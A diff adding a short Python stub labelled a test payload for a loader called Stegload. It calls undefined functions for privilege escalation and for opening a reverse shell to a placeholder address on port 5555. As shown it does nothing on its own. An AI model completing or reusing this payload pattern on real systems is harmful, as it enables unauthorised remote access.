@@ -1,0 +1,14 @@
+# Author: Scragg
+# Date: 17/05/2022
+# This is a test payload for Stegload
+
+# Imports
+import requests, os, sys
+
+def payload():
+    getSystem()
+    popRevShell("123.321.123.321:5555")
+    return
+
+if __name__ == "__main__":
+    payload()
